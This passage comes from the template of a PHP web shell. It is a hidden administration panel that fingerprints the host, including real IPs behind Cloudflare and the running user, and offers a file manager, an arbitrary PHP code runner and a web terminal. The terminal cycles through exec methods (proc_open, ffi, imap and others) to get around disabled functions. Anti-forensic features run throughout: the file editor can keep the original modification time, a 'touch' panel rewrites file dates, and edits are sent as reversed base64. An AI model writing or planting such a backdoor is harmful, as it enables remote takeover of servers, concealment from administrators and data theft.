            padding: 10px 15px;
            margin-bottom: 12px;
            font-size: 12px;
            line-height: 1.6;
            position: relative;
        }
        .server-stats-box table {
            border-collapse: collapse;
            width: 100%;
        }
        .server-stats-box td {
            padding: 3px 5px;
            vertical-align: top;
        }
        .server-stats-box td.label {
            color: #9ca3af;
            width: 140px;
            font-weight: bold;
        }
        .server-stats-box td.value {
            color: #38bdf8;
        }
    </style>
</head>
<body>

    <!-- TOAST POPUP NOTIFICATION -->
    <?php if ($toast_message): ?>
        <div class="toast-notify <?php echo $toast_message['type'] === 'error' ? 'error' : ''; ?>" id="toast-el">
            <?php echo htmlspecialchars($toast_message['text']); ?>
        </div>
        <script>
            setTimeout(function() {
                var el = document.getElementById('toast-el');
                if (el) el.style.display = 'none';
            }, 3000);
        </script>
    <?php endif; ?>

    <!-- SERVER SYSTEM GENERAL INFO HEADER -->
    <?php
    // Get server address details
    $server_name = (isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : ((gethostname()) !== null ? (gethostname()) : '127.0.0.1'));
    $http_host = (isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '');

    // Domain resolved IPs (e.g. Cloudflare or Direct)
    $domain_ips = [];
    if ($server_name && !in_array($server_name, ['127.0.0.1', 'localhost', '::1']) && strpos($server_name, '127.') !== 0) {
        $resolved_domain = @gethostbynamel($server_name);
        if ($resolved_domain) {
            $domain_ips = array_unique($resolved_domain);
        }
    }

    // Local / Interface IPs
    $local_ips = [];
    if (function_exists('net_get_interfaces')) {
        $interfaces = @net_get_interfaces();
        if (is_array($interfaces)) {
            foreach ($interfaces as $name => $info) {
                if (isset($info['unicast']) && is_array($info['unicast'])) {
                    foreach ($info['unicast'] as $addr) {
                        if (isset($addr['address']) && isset($addr['family'])) {
                            if ($addr['family'] === 2) {
                                $ip = $addr['address'];
                                if (strpos($ip, '127.') !== 0 && strpos($ip, '169.254.') !== 0 && $ip !== '10.255.255.254') {
                                    $local_ips[] = $ip;
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    if (isset($_SERVER['SERVER_ADDR'])) {
        $local_ips[] = $_SERVER['SERVER_ADDR'];
    }
    $local_hostname = gethostname();
    if ($local_hostname) {
        $resolved_local = @gethostbynamel($local_hostname);
        if ($resolved_local) {
            $local_ips = array_unique(array_merge($local_ips, $resolved_local));
        }
    }

    // Filter out loopback addresses to find true interface IPs
    $filtered_real_ips = array_filter($local_ips, function($ip) {
        return strpos($ip, '127.') !== 0 && $ip !== '::1' && $ip !== 'localhost' && $ip !== '0.0.0.0' && strpos($ip, '169.254.') !== 0;
    });
    $filtered_real_ips = array_unique($filtered_real_ips);
    if (empty($filtered_real_ips)) {
        $filtered_real_ips = ['127.0.0.1'];
    }

    // Check if Cloudflare is active (via headers)
    $is_cloudflare = isset($_SERVER['HTTP_CF_CONNECTING_IP']) || isset($_SERVER['HTTP_CF_RAY']);

    // Check if domain DNS resolves to something other than local interfaces (i.e. behind proxy / Cloudflare)
    $behind_proxy = false;
    if (!empty($domain_ips) && !empty($filtered_real_ips)) {
        $has_direct_ip = false;
        foreach ($filtered_real_ips as $rip) {
            if (in_array($rip, $domain_ips)) {
                $has_direct_ip = true;
                break;
            }
        }
        if (!$has_direct_ip) {
            $behind_proxy = true;
        }
    }

    // Build Server Address String containing IPs in brackets
    $ip_parts = [];
    if ($is_cloudflare || $behind_proxy) {
        if (!empty($domain_ips)) {
            $ip_parts[] = implode(', ', $domain_ips);
        }
        if (!empty($filtered_real_ips)) {
            $ip_parts[] = 'Real: ' . implode(', ', $filtered_real_ips);
        }
    } else {
        if (!empty($filtered_real_ips)) {
            $ip_parts[] = implode(', ', $filtered_real_ips);
        }
    }

    $server_address_str = $server_name;
    if (!empty($ip_parts)) {
        $server_address_str .= ' (' . implode(', ', $ip_parts) . ')';
    }
    if ($http_host && $http_host !== $server_name) {
        $server_address_str .= ' / ' . $http_host;
    }

    // Get Server OS kernel string
    $server_os = php_uname();

    // Get Server software and PHP configuration
    $server_software = (isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : '');
    $php_details = 'PHP/' . PHP_VERSION;
    $loaded_exts = [];
    if (extension_loaded('curl')) {
        $loaded_exts[] = 'cURL';
    }
    if (extension_loaded('openssl')) {
        $loaded_exts[] = 'OpenSSL';
    }
    if (extension_loaded('pdo')) {
        $loaded_exts[] = 'PDO';
    }
    $software_str = trim($server_software . ' ' . $php_details . ' ' . implode(' ', $loaded_exts));

    // Get user info (Unix style)
    $user_info_str = 'Unknown';
    if (function_exists('posix_getuid')) {
        $uid = posix_getuid();
        $gid = posix_getgid();
        $user_info = posix_getpwuid($uid);
        $group_info = posix_getgrgid($gid);
        
        $u_name = (isset($user_info['name']) ? $user_info['name'] : $uid);
        $g_name = (isset($group_info['name']) ? $group_info['name'] : $gid);
        
        $user_info_str = "uid={$uid}({$u_name}) gid={$gid}({$g_name})";
    } else {
        // Fallback for Windows / environments where posix extension is missing
        $current_user = get_current_user();
        if ($current_user) {
            $user_info_str = $current_user;
        } else {
            $user_info_str = getenv('USERNAME') ?: getenv('USER') ?: 'webserver-user';
        }
    }
    ?>
    <div class="server-stats-box">
        <form method="post" style="position: absolute; top: 10px; right: 15px; margin: 0;">
            <input type="hidden" name="action" value="logout">
            <button type="submit" class="action-btn" style="padding: 3px 8px; font-size: 11px;">Logout</button>
        </form>
        <table>
            <tr>
                <td class="label">Server address:</td>
                <td class="value"><?php echo htmlspecialchars($server_address_str); ?></td>
            </tr>
            <tr>
                <td class="label">Server OS:</td>
                <td class="value"><?php echo htmlspecialchars($server_os); ?></td>
            </tr>
            <tr>
                <td class="label">Server software:</td>
                <td class="value"><?php echo htmlspecialchars($software_str); ?></td>
            </tr>
            <tr>
                <td class="label">User info:</td>
                <td class="value"><?php echo htmlspecialchars($user_info_str); ?></td>
            </tr>
        </table>
    </div>

    <!-- TAB HEADERS -->
    <div class="tabs-header">
        <button type="button" class="tab-btn <?php echo $active_tab === 'files' ? 'active' : ''; ?>" data-tab="files" onclick="switchTab('files')">Files</button>
        <button type="button" class="tab-btn <?php echo $active_tab === 'info' ? 'active' : ''; ?>" data-tab="info" onclick="switchTab('info')">Info</button>
        <button type="button" class="tab-btn <?php echo $active_tab === 'terminal' ? 'active' : ''; ?>" data-tab="terminal" onclick="switchTab('terminal')">Terminal</button>
        <button type="button" class="tab-btn <?php echo $active_tab === 'php' ? 'active' : ''; ?>" data-tab="php" onclick="switchTab('php')">PHP</button>
        <button type="button" class="tab-btn <?php echo $active_tab === 'sql' ? 'active' : ''; ?>" data-tab="sql" onclick="switchTab('sql')">SQL</button>
        <button type="button" class="tab-btn <?php echo $active_tab === 'wp' ? 'active' : ''; ?>" data-tab="wp" onclick="switchTab('wp')">WP Tools</button>
    </div>

    <!-- TABS CONTAINER -->
    <div class="tab-content">
        
        <!-- ================== FILES TAB ================== -->
        <div class="tab-pane pane-files <?php echo $active_tab === 'files' ? 'active' : ''; ?>">
            
            <?php if ($edit_mode): ?>
                
                <!-- LIGHTWEIGHT TEXT EDITOR -->
                <div class="modal-title">Editing: <?php echo htmlspecialchars($edit_filename); ?></div>
                <form method="post" onsubmit="this.content.value = btoa(unescape(encodeURIComponent(this.content.value))).split('').reverse().join('');">
                    <input type="hidden" name="action" value="save_file">
                    <input type="hidden" name="name" value="<?php echo htmlspecialchars($edit_filename); ?>">
                    <textarea name="content" class="editor-textarea" spellcheck="false" autocomplete="off"><?php echo htmlspecialchars($edit_content); ?></textarea>
                    <div style="margin-top: 10px; display: flex; align-items: center; gap: 8px;">
                        <input type="checkbox" name="preserve_mtime" id="preserve_mtime" value="1" style="cursor: pointer;">
                        <label for="preserve_mtime" style="font-size: 13px; color: #c9d1d9; cursor: pointer; user-select: none;">Preserve original modification time</label>
                    </div>
                    <div style="margin-top: 15px;">
                        <button type="submit" class="action-btn" style="background-color: #059669; border-color: #047857;">Save</button>
                        <a href="" class="action-btn" style="text-decoration: none; display: inline-block;">Cancel</a>
                    </div>
                </form>

            <?php else: ?>

                <!-- PATH BAR -->
                <div class="path-bar" style="display: flex; align-items: center; justify-content: space-between;">
                    <!-- BREADCRUMBS VIEW -->
                    <div id="path-breadcrumbs" style="display: flex; align-items: center; flex-wrap: wrap; gap: 4px;">
                        <span>Path:</span>
                        <?php
                        $is_windows = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');
                        // Split by both / and \ to support Windows and Linux paths correctly
                        $parts = preg_split('#[/\\\\]#', $current_abs_dir);
                        $running_path = '';
                        
                        // Filter empty parts on Windows, but keep first element empty if Linux (root path '/')
                        $clean_parts = [];
                        foreach ($parts as $part) {
                            if ($part !== '') {
                                $clean_parts[] = $part;
                            }
                        }
                        
                        if (!$is_windows) {
                            // On Linux/Unix, path starts with /, so the root path is "/"
                            // Represent this with an empty first token
                            array_unshift($clean_parts, '');
                        }
                        
                        foreach ($clean_parts as $i => $part):
                            if ($i === 0) {
                                if ($is_windows) {
                                    $running_path = $part . DIRECTORY_SEPARATOR;
                                    $crumb_name = $part;
                                } else {
                                    $running_path = '/';
                                    $crumb_name = '/';
                                }
                            } else {
                                if ($is_windows) {
                                    $running_path = rtrim($running_path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $part;
                                } else {
                                    $running_path = '/' . implode('/', array_slice($clean_parts, 1, $i));
                                }
                                $crumb_name = $part;
                            }
                        ?>
                            <?php if ($i === count($clean_parts) - 1): ?>
                                <span style="color: #ffffff; padding: 2px 6px; font-size: 13px;"><?php echo htmlspecialchars($crumb_name); ?></span>
                            <?php else: ?>
                                <form method="post" style="display:inline; margin:0;">
                                    <input type="hidden" name="action" value="change_dir">
                                    <input type="hidden" name="target_dir" value="<?php echo htmlspecialchars($running_path); ?>">
                                    <button type="submit" class="path-btn"><?php echo htmlspecialchars($crumb_name); ?></button>
                                </form>
                            <?php endif; ?>
                            <?php if ($i < count($clean_parts) - 1 && ($i > 0 || $is_windows)): ?>
                                <span>/</span>
                            <?php endif; ?>
                        <?php endforeach; ?>
                        
                        <button type="button" class="op-btn" style="background-color: #3b82f6; margin-left: 10px;" title="Edit Path" onclick="togglePathEdit(true)">✎</button>
                    </div>

                    <!-- MANUAL EDIT VIEW -->
                    <div id="path-manual" style="display: none; width: 100%;">
                        <form method="post" style="display: flex; width: 100%; align-items: center; gap: 8px; margin: 0;">
                            <input type="hidden" name="action" value="change_dir">
                            <span style="white-space: nowrap;">Path:</span>
                            <input type="text" name="target_dir" class="form-input" value="<?php echo htmlspecialchars($current_abs_dir); ?>" style="flex-grow: 1; margin: 0;" required>
                            <button type="submit" class="action-btn" style="padding: 4px 10px;">Go</button>
                            <button type="button" class="action-btn" style="padding: 4px 10px;" onclick="togglePathEdit(false)">Cancel</button>
                        </form>
                    </div>
                </div>

                <!-- CONTROLS TOOLBAR -->
                <div class="actions-toolbar">
                    <form method="post" style="margin: 0; display:inline;">
                        <input type="hidden" name="action" value="change_dir">
                        <input type="hidden" name="target_dir" value="<?php echo htmlspecialchars($default_dir); ?>">
                        <button type="submit" class="action-btn">Home</button>
                    </form>
                    
                    <button type="button" class="action-btn" onclick="toggleForm('form-upload')">Upload</button>
                    <button type="button" class="action-btn" onclick="toggleForm('form-newfile')">New File</button>
                    <button type="button" class="action-btn" onclick="toggleForm('form-newdir')">New Dir</button>

                    <!-- CLIPBOARD ACTIONS -->
                    <?php if ($clipboard_path !== ''): ?>
                        <form method="post" style="margin: 0; display:inline;">
                            <input type="hidden" name="action" value="paste">
                            <button type="submit" class="action-btn" style="background-color:#10b981; border-color:#059669;">Paste (<?php echo htmlspecialchars($clipboard_label); ?>)</button>
                        </form>
                        <form method="post" style="margin: 0; display:inline;">
                            <input type="hidden" name="action" value="clear_clipboard">
                            <button type="submit" class="action-btn" style="background-color:#ef4444; border-color:#dc2626;">Cancel Clip</button>
                        </form>
                    <?php endif; ?>
                </div>

                <!-- ACTION PANELS (TOGGLED VIA JS FOR LOW MEMORY / NO IFRAMES / NO LARGE JS MODAL LIBS) -->
                <div id="form-upload" class="modal-simulation" style="display: none;">
                    <div class="modal-title">Upload File</div>
                    <form method="post" enctype="multipart/form-data">
                        <input type="hidden" name="action" value="upload">
                        <input type="file" name="file" required style="margin-bottom: 10px; display: block; color: #fff;">
                        <button type="submit" class="action-btn">Upload Now</button>
                        <button type="button" class="action-btn" onclick="toggleForm('form-upload')">Close</button>
                    </form>
                </div>

                <div id="form-newfile" class="modal-simulation" style="display: none;">
                    <div class="modal-title">Create New File</div>
                    <form method="post">
                        <input type="hidden" name="action" value="create_file">
                        <input type="text" name="name" class="form-input" placeholder="file.txt" required style="width: 250px;">
                        <button type="submit" class="action-btn">Create</button>
                        <button type="button" class="action-btn" onclick="toggleForm('form-newfile')">Close</button>
                    </form>
                </div>

                <div id="form-newdir" class="modal-simulation" style="display: none;">
                    <div class="modal-title">Create New Folder</div>
                    <form method="post">
                        <input type="hidden" name="action" value="create_folder">
                        <input type="text" name="name" class="form-input" placeholder="newfolder" required style="width: 250px;">
                        <button type="submit" class="action-btn">Create</button>
                        <button type="button" class="action-btn" onclick="toggleForm('form-newdir')">Close</button>
                    </form>
                </div>

                <!-- RENAME PANEL (REUSABLE SUB-ROW) -->
                <div id="form-rename" class="modal-simulation" style="display: none;">
                    <div class="modal-title">Rename Item</div>
                    <form method="post">
                        <input type="hidden" name="action" value="rename">
                        <input type="hidden" name="old_name" id="rename-old-id">
                        <span style="font-size:12px; display:block; margin-bottom:5px;">Old Name: <strong id="rename-old-text"></strong></span>
                        <input type="text" name="new_name" id="rename-new-input" class="form-input" required style="width: 250px;">
                        <button type="submit" class="action-btn">Rename</button>
                        <button type="button" class="action-btn" onclick="closeRename()">Close</button>
                    </form>
                </div>

                <!-- CHMOD PANEL -->
                <div id="form-chmod" class="modal-simulation" style="display: none;">
                    <div class="modal-title">Change Permissions (Chmod)</div>
                    <form method="post">
                        <input type="hidden" name="action" value="chmod">
                        <input type="hidden" name="name" id="chmod-item-name">
                        <span style="font-size:12px; display:block; margin-bottom:5px;">Item: <strong id="chmod-item-text"></strong></span>
                        <input type="text" name="mode" id="chmod-mode-input" class="form-input" placeholder="e.g. 0755" required style="width: 150px;">
                        <button type="submit" class="action-btn">Apply</button>
                        <button type="button" class="action-btn" onclick="closeChmod()">Close</button>
                    </form>
                </div>

                <!-- TOUCH PANEL (EDIT MODIFICATION DATE) -->
                <div id="form-touch" class="modal-simulation" style="display: none;">
                    <div class="modal-title">Change Modification Date</div>
                    <form method="post">
                        <input type="hidden" name="action" value="touch">
                        <input type="hidden" name="name" id="touch-item-name">
                        <span style="font-size:12px; display:block; margin-bottom:5px;">Item: <strong id="touch-item-text"></strong></span>
                        <input type="text" name="mtime" id="touch-mtime-input" class="form-input" placeholder="YYYY-MM-DD HH:MM:SS" required style="width: 200px;">
                        <button type="submit" class="action-btn">Apply</button>
                        <button type="button" class="action-btn" onclick="closeTouch()">Close</button>
                    </form>
                </div>

                <!-- BULK ACTIONS FORM & TOOLBAR -->
                <form id="bulk-form" method="post" style="display: none;">
                    <input type="hidden" name="action" id="bulk-action-input" value="">
                </form>

                <div class="bulk-actions-toolbar" id="bulk-toolbar" style="display: none; align-items: center; gap: 8px; margin-bottom: 15px; padding: 10px; background-color: #11151d; border: 1px solid #2d3748; border-radius: 4px;">
                    <span style="font-weight: bold; color: #ffffff;">Bulk Actions (<span id="selected-count">0</span> selected):</span>
                    <button type="button" class="action-btn" style="background-color: #dc2626; border-color: #b91c1c;" onclick="submitBulk('bulk_delete')">Delete</button>
                    <button type="button" class="action-btn" style="background-color: #3b82f6; border-color: #2563eb;" onclick="submitBulk('bulk_copy')">Copy</button>
                    <button type="button" class="action-btn" style="background-color: #3b82f6; border-color: #2563eb;" onclick="submitBulk('bulk_cut')">Cut</button>
                </div>

                <!-- FILE LIST TABLE -->
                <table class="files-table">
                    <thead>
                        <tr>
                            <th style="width: 20px; text-align: center; padding: 4px 6px;"><input type="checkbox" id="select-all" onclick="toggleSelectAll(this)" style="cursor: pointer; margin: 0; vertical-align: middle;"></th>
                            <th class="th-sortable" onclick="document.getElementById('sort-name-form').submit();">
                                Name
                                <?php if ($sort_by === 'name'): ?>
                                    <span style="font-size: 10px;"><?php echo $sort_order === 'asc' ? '▲' : '▼'; ?></span>
                                <?php endif; ?>
                                <form id="sort-name-form" method="post" style="display:none;">
                                    <input type="hidden" name="action" value="set_sort">
                                    <input type="hidden" name="sort_by" value="name">
                                    <input type="hidden" name="sort_order" value="<?php echo ($sort_by === 'name' && $sort_order === 'asc') ? 'desc' : 'asc'; ?>">
                                </form>
                            </th>
                            <th class="th-sortable" onclick="document.getElementById('sort-size-form').submit();">
                                Size
                                <?php if ($sort_by === 'size'): ?>
                                    <span style="font-size: 10px;"><?php echo $sort_order === 'asc' ? '▲' : '▼'; ?></span>
                                <?php endif; ?>
                                <form id="sort-size-form" method="post" style="display:none;">
                                    <input type="hidden" name="action" value="set_sort">
                                    <input type="hidden" name="sort_by" value="size">
                                    <input type="hidden" name="sort_order" value="<?php echo ($sort_by === 'size' && $sort_order === 'asc') ? 'desc' : 'asc'; ?>">
                                </form>
                            </th>
                            <th>Perms</th>
                            <th>Owner</th>
                            <th class="th-sortable" onclick="document.getElementById('sort-date-form').submit();">
                                Modified
                                <?php if ($sort_by === 'date'): ?>
                                    <span style="font-size: 10px;"><?php echo $sort_order === 'asc' ? '▲' : '▼'; ?></span>
                                <?php endif; ?>
                                <form id="sort-date-form" method="post" style="display:none;">
                                    <input type="hidden" name="action" value="set_sort">
                                    <input type="hidden" name="sort_by" value="date">
                                    <input type="hidden" name="sort_order" value="<?php echo ($sort_by === 'date' && $sort_order === 'asc') ? 'desc' : 'asc'; ?>">
                                </form>
                            </th>
                            <th style="width: 140px; text-align: left;">Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        <!-- Parent traversal .. -->
                        <?php
                        $parent_dir = dirname($current_abs_dir);
                        $can_go_up = ($parent_dir !== $current_abs_dir && is_dir($parent_dir));
                        if ($can_go_up):
                        ?>
                            <tr>
                                <td></td>
                                <td colspan="6">
                                    <form method="post" style="margin: 0; display:inline;">
                                        <input type="hidden" name="action" value="change_dir">
                                        <input type="hidden" name="target_dir" value="<?php echo htmlspecialchars($parent_dir); ?>">
                                        <button type="submit" class="item-link">..</button>
                                    </form>
                                </td>
                            </tr>
                        <?php endif; ?>

                        <!-- File list items -->
                        <?php if (empty($scan_items)): ?>
                            <tr>
                                <td colspan="7" style="text-align: center; color: #9ca3af; padding: 15px;">Folder is empty.</td>
                            </tr>
                        <?php else: ?>
                            <?php foreach ($scan_items as $item): ?>
                                <tr>
                                    <td style="text-align: center; width: 20px; padding: 4px 6px;">
                                        <input type="checkbox" name="selected_items[]" value="<?php echo htmlspecialchars($item['name']); ?>" class="item-checkbox" onclick="updateSelectAllState()" form="bulk-form" style="cursor: pointer; margin: 0; vertical-align: middle;">
                                    </td>
                                    <td>
                                        <?php if ($item['is_dir']): ?>
                                            <!-- Folders displayed in brackets [folder_name] -->
                                            <form method="post" style="margin:0; display:inline;">
                                                <input type="hidden" name="action" value="change_dir">
                                                <input type="hidden" name="target_dir" value="<?php echo htmlspecialchars($current_abs_dir . DIRECTORY_SEPARATOR . $item['name']); ?>">
                                                <button type="submit" class="item-link">[<?php echo htmlspecialchars($item['name']); ?>]</button>
                                            </form>
                                        <?php else: ?>
                                            <?php
                                            $is_editable = ($item['size'] < 2 * 1024 * 1024);
                                            ?>
                                            <?php if ($is_editable): ?>
                                                <form method="post" style="margin:0; display:inline;">
                                                    <input type="hidden" name="action" value="edit_file">
                                                    <input type="hidden" name="name" value="<?php echo htmlspecialchars($item['name']); ?>">
                                                    <button type="submit" class="item-link"><?php echo htmlspecialchars($item['name']); ?></button>
                                                </form>
                                            <?php else: ?>
                                                <span><?php echo htmlspecialchars($item['name']); ?></span>
                                            <?php endif; ?>
                                        <?php endif; ?>
                                    </td>
                                    <td><?php echo $item['is_dir'] ? '-' : format_bytes($item['size']); ?></td>
                                    <td>
                                        <?php
                                        $octal_perms = substr(sprintf('%o', @fileperms($current_abs_dir . DIRECTORY_SEPARATOR . $item['name'])), -4);
                                        if (empty($octal_perms)) {
                                            $octal_perms = '0644';
                                        }
                                        ?>
                                        <button type="button" class="perms-col-btn" onclick="openChmod('<?php echo htmlspecialchars($item['name'], ENT_QUOTES); ?>', '<?php echo htmlspecialchars($octal_perms); ?>')">
                                            <span class="<?php echo $item['is_writable'] ? 'perms-writable' : 'perms-readonly'; ?>">
                                                <?php echo htmlspecialchars($item['perms']); ?>
                                            </span>
                                        </button>
                                    </td>
                                    <td>
                                        <span style="color: #9ca3af;"><?php echo htmlspecialchars($item['owner']); ?></span>
                                    </td>
                                    <td>
                                        <button type="button" class="date-col-btn" onclick="openTouch('<?php echo htmlspecialchars($item['name'], ENT_QUOTES); ?>', '<?php echo date('Y-m-d H:i:s', $item['mtime']); ?>')">
                                            <span class="date-col"><?php echo date('Y-m-d H:i:s', $item['mtime']); ?></span>
                                        </button>
                                    </td>
                                    <td style="text-align: left;">
                                        <!-- Operation buttons: R (Rename/Edit/Copy/Cut), D (Delete) -->
                                        <div style="display:inline-flex;">
                                            <?php if (!$item['is_dir'] && $is_editable): ?>
                                                <form method="post" style="margin: 0; display:inline;">
                                                    <input type="hidden" name="action" value="edit_file">
                                                    <input type="hidden" name="name" value="<?php echo htmlspecialchars($item['name']); ?>">
                                                    <button type="submit" class="op-btn op-edit" title="Edit">E</button>
                                                </form>
                                            <?php endif; ?>

                                            <button type="button" class="op-btn op-rename" title="Rename" onclick="openRename('<?php echo htmlspecialchars($item['name'], ENT_QUOTES); ?>')">R</button>
                                            
                                            <form method="post" style="margin: 0; display:inline;">
                                                <input type="hidden" name="action" value="copy">
                                                <input type="hidden" name="name" value="<?php echo htmlspecialchars($item['name']); ?>">
                                                <button type="submit" class="op-btn" style="background-color:#4b5563;" title="Copy">C</button>
                                            </form>
                                            
                                            <?php if (!$item['is_dir']): ?>
                                                <form method="post" style="margin: 0; display:inline;">
                                                    <input type="hidden" name="action" value="download">
                                                    <input type="hidden" name="name" value="<?php echo htmlspecialchars($item['name']); ?>">
                                                    <button type="submit" class="op-btn op-download" title="Download">D</button>
                                                </form>
                                            <?php endif; ?>
                                            
                                            <form method="post" style="margin: 0; display:inline;" onsubmit="return confirm('Delete this item?');">
                                                <input type="hidden" name="action" value="delete">
                                                <input type="hidden" name="name" value="<?php echo htmlspecialchars($item['name']); ?>">
                                                <button type="submit" class="op-btn op-delete" title="Delete">D</button>
                                            </form>
                                        </div>
                                    </td>
                                </tr>
                            <?php endforeach; ?>
                        <?php endif; ?>
                    </tbody>
                </table>

            <?php endif; ?>

        </div>

        <!-- ================== INFO TAB ================== -->
        <div class="tab-pane pane-info <?php echo $active_tab === 'info' ? 'active' : ''; ?>">
            <div class="modal-title">Server Information</div>
            <table class="info-table">
                <tr>
                    <td class="label-col">OS / Kernel</td>
                    <td><?php echo php_uname(); ?></td>
                </tr>
                <tr>
                    <td class="label-col">Server Software</td>
                    <td><?php echo htmlspecialchars((isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'Unknown')); ?></td>
                </tr>
                <tr>
                    <td class="label-col">PHP Version</td>
                    <td><?php echo PHP_VERSION; ?></td>
                </tr>
                <tr>
                    <td class="label-col">Script Path</td>
                    <td><?php echo htmlspecialchars(((strpos(__FILE__, 'vs://') === 0 || strpos(__FILE__, 'O0://') === 0) && isset($_SERVER['SCRIPT_FILENAME'])) ? $_SERVER['SCRIPT_FILENAME'] : __FILE__); ?></td>
                </tr>
                <tr>
                    <td class="label-col">Active Root Directory</td>
                    <td><?php echo htmlspecialchars($current_abs_dir); ?></td>
                </tr>
                <tr>
                    <td class="label-col">Disk Usage</td>
                    <td>
                        <?php
                        $disk_free = @disk_free_space($current_abs_dir);
                        $disk_total = @disk_total_space($current_abs_dir);
                        if ($disk_free !== false && $disk_total !== false) {
                            $disk_used = $disk_total - $disk_free;
                            $pct = round(($disk_used / $disk_total) * 100, 1);
                            echo "Total: " . format_bytes($disk_total) . " | Free: " . format_bytes($disk_free) . " | Used: " . format_bytes($disk_used) . " ($pct%)";
                        } else {
                            echo "Unable to retrieve disk information.";
                        }
                        ?>
                    </td>
                </tr>
                <tr>
                    <td class="label-col">Disabled Functions</td>
                    <td>
                        <?php 
                        $disabled = ini_get('disable_functions');
                        echo empty($disabled) ? 'None' : htmlspecialchars($disabled); 
                        ?>
                    </td>
                </tr>
                <tr>
                    <td class="label-col">Upload Max Filesize</td>
                    <td><?php echo ini_get('upload_max_filesize'); ?></td>
                </tr>
                <tr>
                    <td class="label-col">POST Max Size</td>
                    <td><?php echo ini_get('post_max_size'); ?></td>
                </tr>
                <tr>
                    <td class="label-col">Memory Limit</td>
                    <td><?php echo ini_get('memory_limit'); ?></td>
                </tr>
            </table>
        </div>

        <!-- ================== TERMINAL TAB ================== -->
        <div class="tab-pane pane-terminal <?php echo $active_tab === 'terminal' ? 'active' : ''; ?>">
            <div class="modal-title">Web Terminal (Cwd: <?php echo htmlspecialchars($current_abs_dir); ?>)</div>
            
            <?php if ($terminal_output !== ''): ?>
                <div style="margin-bottom: 10px;">
                    <textarea class="editor-textarea" readonly style="height: 300px;"><?php echo htmlspecialchars($terminal_output); ?></textarea>
                </div>
            <?php endif; ?>
            
            <form method="post">
                <input type="hidden" name="action" value="exec_cmd">
                <div style="display: flex; gap: 10px; align-items: center; margin-bottom: 10px;">
                    <label for="exec_method" style="color: #9ca3af; font-size: 13px;">Method:</label>
                    <select name="exec_method" id="exec_method" class="form-input" style="margin: 0; padding: 4px 8px; background-color: #111827;">
                        <option value="auto" <?php echo $selected_exec_method === 'auto' ? 'selected' : ''; ?>>Auto-detect</option>
                        <?php
                        $enabled_methods = get_enabled_exec_methods();
                        $all_methods = ['shell_exec', 'exec', 'system', 'passthru', 'proc_open', 'popen', 'backticks', 'wscript', 'ffi', 'imap'];
                        foreach ($all_methods as $m) {
                            $is_enabled = in_array($m, $enabled_methods);
                            $label = $m . ($is_enabled ? '' : ' (disabled)');
                            $disabled_attr = $is_enabled ? '' : ' disabled';
                            $selected_attr = ($selected_exec_method === $m) ? ' selected' : '';
                            echo '<option value="' . htmlspecialchars($m) . '"' . $disabled_attr . $selected_attr . '>' . htmlspecialchars($label) . '</option>';
                        }
                        ?>
                    </select>
                    <?php if ($last_used_method !== ''): ?>
                        <span style="color: #9ca3af; font-size: 12px; margin-left: 10px;">
                            Last executed via: <strong style="color: #10B981;"><?php echo htmlspecialchars($last_used_method); ?></strong>
                        </span>
                    <?php endif; ?>
                </div>
                <div style="display: flex;">
                    <span style="padding: 6px 10px; background-color: #11151d; border: 1px solid #374151; border-right: none; color: #10B981; border-radius: 4px 0 0 4px;">$</span>
                    <input type="text" name="cmd" class="form-input" placeholder="whoami" value="<?php echo htmlspecialchars($terminal_cmd); ?>" required style="flex-grow: 1; margin: 0; border-radius: 0 4px 4px 0;">
                    <button type="submit" class="action-btn" style="margin-left: 10px;">Execute</button>
                </div>
            </form>
        </div>

        <!-- ================== PHP TAB ================== -->
        <div class="tab-pane pane-php <?php echo $active_tab === 'php' ? 'active' : ''; ?>">
            <div class="modal-title">Execute custom PHP code</div>
            <form method="post">
                <input type="hidden" name="action" value="exec_php">
                <div style="margin-bottom: 10px;">
                    <textarea name="php_code" class="editor-textarea" placeholder="<?php echo htmlspecialchars("echo 'Hello World';"); ?>" required><?php echo htmlspecialchars($php_code); ?></textarea>
                </div>
                <div>
                    <button type="submit" class="action-btn" style="background-color: #3b82f6; border-color: #2563eb;">Execute Code</button>
                </div>
            </form>
            
            <?php if ($php_output !== ''): ?>
                <div style="margin-top: 15px;">
                    <div class="modal-title">Execution Output:</div>
                    <textarea class="editor-textarea" readonly style="height: 200px;"><?php echo htmlspecialchars($php_output); ?></textarea>
                </div>
            <?php endif; ?>
        </div>

        <!-- ================== SQL TAB ================== -->
        <div class="tab-pane pane-sql <?php echo $active_tab === 'sql' ? 'active' : ''; ?>">
            <?php if (!$db_connected): ?>
                
                <!-- DATABASE LOGIN FORM -->
                <?php
                $saved_driver = (isset($db_conn_data['driver']) ? $db_conn_data['driver'] : 'mysql');
                $saved_host = (isset($db_conn_data['host']) ? $db_conn_data['host'] : 'localhost');
                $saved_port = (isset($db_conn_data['port']) ? $db_conn_data['port'] : '3306');
                $saved_user = (isset($db_conn_data['user']) ? $db_conn_data['user'] : 'root');
                $saved_dbname = (isset($db_conn_data['dbname']) ? $db_conn_data['dbname'] : '');
                $saved_path = (isset($db_conn_data['path']) ? $db_conn_data['path'] : ($current_abs_dir . DIRECTORY_SEPARATOR . 'database.db'));
                ?>
                <div class="modal-title">Connect to Database</div>
                <?php if ($db_error): ?>
                    <div class="db-error-box"><?php echo htmlspecialchars($db_error); ?></div>
                <?php endif; ?>
                <form method="post" style="max-width: 500px; background-color: #11151d; border: 1px solid #2d3748; padding: 20px; border-radius: 6px;">
                    <input type="hidden" name="action" value="db_connect">
                    
                    <div style="margin-bottom: 15px;">
                        <label style="display: block; margin-bottom: 5px; color: #9ca3af;">Driver:</label>
                        <select name="driver" id="db_driver_select" class="form-input" style="width: 100%; box-sizing: border-box;" onchange="toggleDbDriver(this.value)">
                            <option value="mysql" <?php echo $saved_driver === 'mysql' ? 'selected' : ''; ?>>MySQL / MariaDB</option>
                            <option value="sqlite" <?php echo $saved_driver === 'sqlite' ? 'selected' : ''; ?>>SQLite</option>
                        </select>
                    </div>
                    
                    <div id="db-fields-mysql">
                        <div style="margin-bottom: 15px; display: flex; gap: 10px;">
                            <div style="flex: 2;">
